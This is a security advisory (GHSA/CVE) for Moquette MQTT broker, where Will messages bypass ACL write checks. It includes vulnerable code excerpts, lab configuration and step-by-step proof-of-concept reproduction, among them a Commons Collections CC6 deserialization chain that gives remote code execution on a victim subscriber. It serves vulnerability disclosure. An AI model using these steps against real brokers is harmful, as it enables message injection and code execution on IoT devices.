# io.moquette:moquette-broker has a Missing Authorization issue

- GHSA: GHSA-9jjc-fw8x-fmwx
- CVE: CVE-2026-85058
- Published: 2026-09-18T17:58:39Z
- GHSA severity: high
- CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (7.5)
- CWE: CWE-862
- Packages: maven:io.moquette:moquette-broker
- Source: https://github.com/advisories/GHSA-9jjc-fw8x-fmwx

---

## Summary

Moquette MQTT Broker fails to enforce ACL write permission checks when publishing Will (Last Will and Testament) messages on behalf of disconnected clients. All normal PUBLISH paths (`receivedPublishQos0`, `receivedPublishQos1`, `receivedPublishQos2`) correctly invoke `authorizator.canWrite()` before publishing, but the Will message publishing path (`fireWill()` → `publishWill()` → `publish2Subscribers()`) completely bypasses this authorization check.

This allows an unauthenticated attacker (when `allow_anonymous=true`, which is the default) to inject arbitrary messages into any ACL-protected topic by setting a restricted topic as the Will Topic in the CONNECT packet and then disconnecting abruptly via TCP RST.

Other major MQTT Broker implementations (Mosquitto, EMQX, HiveMQ) correctly enforce ACL checks on Will messages, confirming this is a bug, not a design choice.

## Details

In the MQTT protocol, a client can declare a "Will" topic and message in the CONNECT packet. When the client disconnects abnormally (without sending a DISCONNECT packet), the Broker publishes the Will message on behalf of the client. Although the Will message content (topic and payload) is entirely controlled by the connecting client — making it functionally equivalent to a PUBLISH — Moquette skips the ACL check for this path.

### Root Cause

**File**: `broker/src/main/java/io/moquette/broker/PostOffice.java` (v0.18.0)

Will publishing path (lines 286-328) — **no canWrite() check**:
```java
public void fireWill(Session bindedSession) {
    final ISessionsRepository.Will will = bindedSession.getWill();
    if (will.delayInterval == 0) {
        publishWill(will);  // No canWrite() check!
    } else {
        trackWillSpecificationForFutureFire(...);
    }
}

private void publishWill(ISessionsRepository.Will will) {
    // ... build message ...
    publish2Subscribers(WILL_PUBLISKER, messageExpiryInstant, willPublishMessage);
    // No canWrite() check!
}
```

Normal PUBLISH path (line 641) — **has canWrite() check**:
```java
if (!authorizator.canWrite(topic, username, clientID)) {
    LOG.error("client is not authorized to publish on topic: {}", topic);
    return;
}
```

Additionally, `SessionRegistry.createNewWill()` (line 408-428) stores the Will topic from the CONNECT packet without any `canWrite()` pre-check. The `fireWill()`/`publishWill()` method is the only publishing path that does not invoke `authorizator.canWrite()`, creating a complete authorization bypass.

### Prerequisites

| Condition | Who controls | Default? | Notes |
|-----------|-------------|----------|-------|
| Attacker can establish MQTT connection to Broker | Environment | Yes | `allow_anonymous` defaults to true |
| Broker has ACL restricting topic write access | Application | No | Only deployments with ACL configured have "bypass" significance, but this is a normal security deployment |
| Client disconnects abnormally (TCP RST, not DISCONNECT) | Attacker | Yes | Attacker simply closes the TCP connection |

## PoC

Verified against Moquette Broker **v0.18.0** (latest release as of 2024-12-27). All scripts are included in the attached `GitHub_Advisory_POC.zip`.
[GitHub_Advisory_POC.zip](https://github.com/user-attachments/files/29499548/GitHub_Advisory_POC.zip)
### Environment Setup

**Step 1: Download Moquette Broker v0.18.0**

Download the official release bundle from GitHub and extract:

```bash
curl -L -o /tmp/moquette-0.18-bundle.tar.gz "https://github.com/moquette-io/moquette/releases/download/v0.18.0/distribution-0.18-bundle.tar.gz"
mkdir -p /tmp/moquette-0.18
tar xzf /tmp/moquette-0.18-bundle.tar.gz -C /tmp/moquette-0.18
```

**Step 2: Configure ACL rules**

Replace `/tmp/moquette-0.18/config/acl.conf` with the provided `acl.conf` (from POC zip), which contains:

```conf
# acl.conf - restrict write access to restricted/topic
topic write allowed/topic
topic read restricted/topic
```

> Note: Must use `topic` rules (not `pattern` rules). Moquette's `AuthorizationsCollector.canDoOperation()` skips `pattern` rules when username is null (anonymous users), because `isNotEmpty(null)` returns false.

Edit `/tmp/moquette-0.18/config/moquette.conf` to ensure ACL is enabled. Use the provided `moquette.conf` (from POC zip) as reference:

```conf
# moquette.conf
port 1883
host 0.0.0.0
allow_anonymous true
acl_file config/acl.conf
```

**Step 3: Download dependency and compile POC scripts**

Download `commons-collections-3.2.1.jar` (required by CC6 deserialization chain) and compile the POC Java sources (all from POC zip):

```bash
# Download commons-collections (required for CC6 RCE POC only)
# Place commons-collections-3.2.1.jar in /tmp/

# Compile POC scripts
cd /tmp
javac -cp /tmp/commons-collections-3.2.1.jar CC6PayloadGen.java          # CC6 deserialization payload generator
javac -cp /tmp/commons-collections-3.2.1.jar AttackerCC6_v018.java       # Attacker-side full POC (Will bypass + CC6 RCE)
javac MqttDeviceService_v018.java                                         # Victim-side IoT subscriber service
```

Scripts overview:

| Script | Language | Purpose |
|--------|----------|---------|
| `poc_will_bypass.py` | Python | Lightweight Will ACL bypass verification (no Java/deserialization dependency) |
| `AttackerCC6_v018.java` | Java | Full attacker POC: generates CC6 payload, verifies ACL blocks direct PUBLISH, bypasses ACL via Will, verifies victim-side RCE |
| `CC6PayloadGen.java` | Java | CC6 deserialization payload generator (dependency of AttackerCC6_v018) |
| `MqttDeviceService_v018.java` | Java | Victim-side IoT device subscriber — subscribes to `restricted/topic`, deserializes received messages via `ObjectInputStream.readObject()` |
| `MoquetteWillAclBypassPoc.java` | Java | Standalone pure-Java POC for v0.15 (no external dependencies, verifies Will ACL bypass only) |
| `acl.conf` | Config | ACL rules — `restricted/topic` read-only, no write |
| `moquette.conf` | Config | Broker configuration — enables ACL, allows anonymous |

### Reproduction — Will ACL Bypass Only (Python, no dependencies)

This verifies the core vulnerability: Will message bypasses ACL. Uses `poc_will_bypass.py`.

**Terminal 1 — Start the Broker** (using Moquette's built-in main class `io.moquette.broker.Server`):

```bash
cd /tmp/moquette-0.18 && java -cp 'lib/*:lib' io.moquette.broker.Server
```

Wait for "Server started" log.

**Terminal 2 — Run POC**:

```bash
python3 poc_will_bypass.py
```

This script automatically performs:
1. Subscriber connects and subscribes to `restricted/topic`
2. Verifies direct PUBLISH to `restricted/topic` is blocked by ACL
3. Attacker connects with Will Topic=`restricted/topic`, then RST-disconnects
4. Checks if subscriber received the Will message on the restricted topic

**Expected output**:
```
[Step 1] Direct PUBLISH to restricted/topic (should be blocked)
  [+] No message - ACL blocking direct PUBLISH (expected)

[Step 2] Will ACL Bypass on v0.18.0
  SUBACK: 9003000100
  Attacker connected, Will set to 'restricted/topic'
  RST disconnecting attacker...
  [!!!] WILL MESSAGE RECEIVED on restricted/topic!
  [!!!] VULNERABILITY CONFIRMED on Moquette v0.18.0!
```

### Reproduction — Full RCE Chain (Will Bypass + CC6 Deserialization)

This demonstrates the real-world impact: Will bypass + Java deserialization = Remote Code Execution. Uses `AttackerCC6_v018.java`, `CC6PayloadGen.java`, and `MqttDeviceService_v018.java`.

**Terminal 1 — Start the Broker** (using Moquette's built-in main class `io.moquette.broker.Server`):

```bash
cd /tmp/moquette-0.18 && java -cp 'lib/*:lib' io.moquette.broker.Server
```

Wait for "Server started" log.

**Terminal 2 — Start victim subscriber** (`MqttDeviceService_v018.java`):

```bash
cd /tmp && java -cp .:/tmp/commons-collections-3.2.1.jar MqttDeviceService_v018 localhost 1883
```

This simulates an IoT device that subscribes to `restricted/topic` and deserializes received messages via `ObjectInputStream.readObject()`. Wait for:

```
[等待中]   等待管理平台下发指令...
```

**Terminal 3 — Run attacker POC** (`AttackerCC6_v018.java`):

```bash
cd /tmp && java -cp .:/tmp/commons-collections-3.2.1.jar AttackerCC6_v018 localhost 1883
```

This script automatically performs:
1. **Generate CC6 payload** — uses `CC6PayloadGen.java` to create a Commons Collections CC6 deserialization chain that executes `touch /tmp/pwned_by_will_bypass_<timestamp>`
2. **Verify direct PUBLISH is blocked** — attempts PUBLISH to `restricted/topic`, confirms ACL blocks it
3. **Bypass ACL via Will** — CONNECT with Will Topic=`restricted/topic`, Will Message=CC6 serialized payload, then RST disconnect
4. **Verify victim-side RCE** — checks if `/tmp/pwned_by_will_bypass_<timestamp>` file was created on the victim

> Key verification point: Java CC6 chain triggers `exec` once during `HashMap.put()` when constructing the payload (a known CC6 artifact). The POC deletes this file before the Will bypass step, then verifies the file is re-created by the victim's `readObject()`, confirming the RCE is on the victim side, not a POC construction side-effect.

**Expected attacker output** (Terminal 3):
```
=== 攻击者 (CC6原生反序列化链) - Moquette v0.18.0 ===
[1] 生成CC6反序列化payload...
    payload长度: 1189 字节
[2] 直接PUBLISH到restricted topic (应被ACL拦截)...
    已发送
[3] 通过Will消息绕过ACL...
    已连接，Will Topic=restricted/topic
    Will Payload=CC6序列化数据(1189字节)
    RST断开连接...
    已断开，Will消息绕过ACL投递成功
[4] 验证受害者端RCE:
    -rw-r--r-- 1 fire fire 0 ... /tmp/pwned_by_will_bypass_XXXXXXXXXXXXX
    *** RCE成功! Will消息绕过ACL投递CC6 payload，受害者readObject()触发命令执行! ***
```

**Expected victim output** (Terminal 2):
```
[收到消息] MQTT消息到达，长度=1189字节
[反序列化] 正在执行 ObjectInputStream.readObject() ...
[反序列化] 完成，对象类型: java.util.HashMap
```

## Impact

- **Authorization Bypass**: Attacker can inject arbitrary messages into any ACL-restricted topic, completely undermining the Broker's access control
- **Remote Code Execution**: When subscribers deserialize MQTT message payloads (e.g., using Java `ObjectInputStream.readObject()`), attacker can inject deserialization gadgets (e.g., Commons Collections CC6 chain) to achieve RCE
- **Affected scope**: All IoT/messaging middleware scenarios using Moquette as MQTT Broker with ACL enabled

| Metric | Value | Rationale |
|--------|-------|-----------|
| Attack Vector | Network | MQTT Broker listens on TCP port, network-reachable |
| Attack Complexity | Low | Standard MQTT CONNECT + TCP RST, no special conditions needed |
| Privileges Required | None | `allow_anonymous` defaults to true |
| User Interaction | None | Fully automated attack |
| Scope | Unchanged | Impact limited to Broker's security domain |
| Confidentiality | None | No data disclosure |
| Integrity | High | ACL write protection completely bypassed |
| Availability | None | No service disruption |
[GitHub_Advisory_POC.zip](https://github.com/user-attachments/files/29499548/GitHub_Advisory_POC.zip)
